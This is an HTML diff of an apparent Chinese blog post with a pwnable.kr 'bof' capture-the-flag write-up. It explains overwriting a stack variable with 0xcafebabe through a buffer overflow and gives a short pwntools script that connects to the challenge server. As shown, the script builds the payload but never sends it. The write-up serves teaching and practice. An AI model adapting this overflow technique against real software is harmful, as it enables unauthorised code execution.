@@ -283,14 +283,13 @@
       
         <p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/4.png" class></strong></p>
  <a id="more"></a>
+
 <p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/1.png" class></strong></p>
-<h3 id="查看给出的c语言源代码"><a class="markdownIt-Anchor" href="#查看给出的c语言源代码"></a> 查看给出的c语言源代码</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/2.png" class></strong></p>
+<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/2.png" class></strong></p>
 <p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
-<h3 id="ida32打开文件"><a class="markdownIt-Anchor" href="#ida32打开文件"></a> IDA32打开文件</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/3.png" class></strong></p>
-<h3 id="编写python脚本"><a class="markdownIt-Anchor" href="#编写python脚本"></a> 编写python脚本</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/3.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -374,7 +373,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%BB%99%E5%87%BA%E7%9A%84c%E8%AF%AD%E8%A8%80%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.</span> <span class="nav-text"> 查看给出的c语言源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ida32%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text"> IDA32打开文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99python%E8%84%9A%E6%9C%AC"><span class="nav-number">3.</span> <span class="nav-text"> 编写python脚本</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%BB%99%E5%87%BA%E7%9A%84c%E8%AF%AD%E8%A8%80%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.</span> <span class="nav-text">查看给出的c语言源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA32%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">IDA32打开文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99python%E8%84%9A%E6%9C%AC"><span class="nav-number">3.</span> <span class="nav-text">编写python脚本</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -390,7 +389,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/xiaohong404.github.io/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -441,7 +440,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020-10-30</span>
+  <span itemprop="copyrightYear">2020-11-03</span>
   <span class="with-love",id="animate">
     <i class="fa fa-basketball-ball"></i>
   </span>
